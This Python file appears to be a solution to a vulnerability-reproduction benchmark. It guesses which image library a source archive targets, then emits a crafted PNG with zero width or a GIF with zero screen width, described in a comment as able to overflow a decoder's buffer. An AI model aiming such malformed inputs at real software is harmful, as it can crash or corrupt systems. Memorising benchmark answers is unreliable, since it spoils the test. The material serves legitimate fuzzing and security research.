import os
import io
import tarfile
import zipfile
import zlib
from typing import Dict, Iterable, Tuple, Optional


def _png_chunk(typ: bytes, data: bytes) -> bytes:
    ln = len(data).to_bytes(4, "big")
    crc = (zlib.crc32(typ) ^ 0) & 0xFFFFFFFF
    crc = (zlib.crc32(data, crc) ^ 0) & 0xFFFFFFFF
    return ln + typ + data + crc.to_bytes(4, "big")


def _gen_png_zero_width(height: int = 16) -> bytes:
    # PNG signature
    sig = b"\x89PNG\r\n\x1a\n"
    width = 0

    # IHDR: width(4), height(4), bit depth(1), color type(1), compression(1), filter(1), interlace(1)
    ihdr = (
        width.to_bytes(4, "big")
        + height.to_bytes(4, "big")
        + bytes([8, 0, 0, 0, 0])  # 8-bit grayscale
    )

    # Uncompressed image data: one filter byte per scanline since rowbytes==0
    raw = b"\x00" * height
    comp = zlib.compress(raw, 9)

    return (
        sig
        + _png_chunk(b"IHDR", ihdr)
        + _png_chunk(b"IDAT", comp)
        + _png_chunk(b"IEND", b"")
    )


def _gen_gif_zero_screen_width() -> bytes:
    # Crafted to have logical screen width = 0, but contains a 1x1 image.
    # If allocator uses screen size (0) but decoder writes pixels from image descriptor, may overflow.
    header = b"GIF89a"
    screen_w = (0).to_bytes(2, "little")
    screen_h = (1).to_bytes(2, "little")

    packed = bytes([0xF0])  # GCT present, 2 colors
    bg = b"\x00"
    aspect = b"\x00"
    gct = b"\x00\x00\x00\xff\xff\xff"

    img_sep = b"\x2C"
    left = (0).to_bytes(2, "little")
    top = (0).to_bytes(2, "little")
    img_w = (1).to_bytes(2, "little")
    img_h = (1).to_bytes(2, "little")
    img_packed = b"\x00"

    lzw_min = b"\x02"
    # LZW codes with min code size 2 (clear=4, end=5): [4,0,5] -> bytes 0x44 0x01
    sub = b"\x02\x44\x01\x00"
    trailer = b"\x3B"

    return header + screen_w + screen_h + packed + bg + aspect + gct + img_sep + left + top + img_w + img_h + img_packed + lzw_min + sub + trailer


def _iter_archive_members(src_path: str) -> Iterable[Tuple[str, bytes]]:
    lower = src_path.lower()
    if os.path.isdir(src_path):
        total = 0
        max_total = 24 * 1024 * 1024
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                rel = os.path.relpath(p, src_path).replace("\\", "/")
                try:
                    sz = os.path.getsize(p)
                except OSError:
                    continue
                to_read = 65536 if sz > 65536 else sz
                if total + to_read > max_total:
                    return
                try:
                    with open(p, "rb") as f:
                        data = f.read(to_read)
                except OSError:
                    continue
                total += to_read
                yield rel, data
        return

    if lower.endswith((".zip", ".jar")):
        with zipfile.ZipFile(src_path, "r") as zf:
            total = 0
            max_total = 24 * 1024 * 1024
            for info in zf.infolist():
                if info.is_dir():
                    continue
                name = info.filename
                to_read = min(info.file_size, 65536)
                if total + to_read > max_total:
                    break
                try:
                    with zf.open(info, "r") as f:
                        data = f.read(to_read)
                except Exception:
                    continue
                total += to_read
                yield name, data
        return

    # default tar.*
    with tarfile.open(src_path, "r:*") as tf:
        total = 0
        max_total = 24 * 1024 * 1024
        for m in tf.getmembers():
            if not m.isreg():
                continue
            name = m.name
            to_read = min(m.size, 65536)
            if total + to_read > max_total:
                break
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read(to_read)
            except Exception:
                continue
            total += to_read
            yield name, data


def _detect_format(src_path: str) -> str:
    fmt_keywords: Dict[str, Tuple[int, ...]] = {
        "png": (0,),
        "gif": (0,),
        "bmp": (0,),
        "tiff": (0,),
        "jpeg": (0,),
        "webp": (0,),
        "avif": (0,),
        "heif": (0,),
        "jxl": (0,),
        "ico": (0,),
        "qoi": (0,),
    }
    scores: Dict[str, int] = {k: 0 for k in fmt_keywords}

    def add(fmt: str, pts: int) -> None:
        if fmt in scores:
            scores[fmt] += pts

    # simple keyword sets
    kw = {
        "png": [
            b"png",
            b"ihdr",
            b"idat",
            b"libpng",
            b"spng",
            b"lodepng",
            b"stb_image",
            b"png_read",
            b"png_sig",
        ],
        "gif": [b"gif", b"gif89a", b"giflib", b"dgif", b"egif"],
        "bmp": [b"bmp", b"bitmap", b"dib", b"biwidth", b"biheight"],
        "tiff": [b"tiff", b"tiffio", b"ifd", b"bigtiff"],
        "jpeg": [b"jpeg", b"jpeglib", b"libjpeg", b"jfif"],
        "webp": [b"webp", b"vp8", b"riff", b"webpdecode"],
        "avif": [b"avif"],
        "heif": [b"heif", b"libheif"],
        "jxl": [b"jxl", b"jpegxl"],
        "ico": [b".ico", b"icon"],
        "qoi": [b"qoi"],
    }

    best_fmt = "png"
    best_score = -1

    for name, data in _iter_archive_members(src_path):
        nlow = name.lower().encode("utf-8", "ignore")
        # name-based scoring
        if b"png" in nlow:
            add("png", 2)
        if b"gif" in nlow:
            add("gif", 2)
        if b"bmp" in nlow:
            add("bmp", 2)
        if b"tif" in nlow or b"tiff" in nlow:
            add("tiff", 2)
        if b"jpeg" in nlow or b"jpg" in nlow:
            add("jpeg", 2)
        if b"webp" in nlow:
            add("webp", 2)
        if b"avif" in nlow:
            add("avif", 2)
        if b"heif" in nlow:
            add("heif", 2)
        if b"jxl" in nlow:
            add("jxl", 2)
        if b"ico" in nlow:
            add("ico", 2)
        if b"qoi" in nlow:
            add("qoi", 2)

        blob = data.lower()
        for fmt, kws in kw.items():
            for k in kws:
                if k in blob:
                    add(fmt, 3)
                    break

        # fuzzer presence boosts image formats
        if b"llvmfuzzertestoneinput" in blob or b"honggfuzz" in blob:
            for f in ("png", "gif", "bmp", "tiff", "jpeg", "webp", "avif", "heif", "jxl", "ico", "qoi"):
                add(f, 1)

        # track best
        for f, sc in scores.items():
            if sc > best_score:
                best_score = sc
                best_fmt = f

        # early exit if strong confidence
        if best_score >= 15:
            break

    # prefer common decoders if tie/low score
    if best_score <= 0:
        return "png"
    return best_fmt


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = _detect_format(src_path)

        if fmt == "gif":
            return _gen_gif_zero_screen_width()
        # Many image fuzzers support PNG even if project is "jpeg"/"tiff" etc via shared decoders.
        # Default to PNG since it's easy to craft valid structure and commonly fuzzed.
        return _gen_png_zero_width(height=64)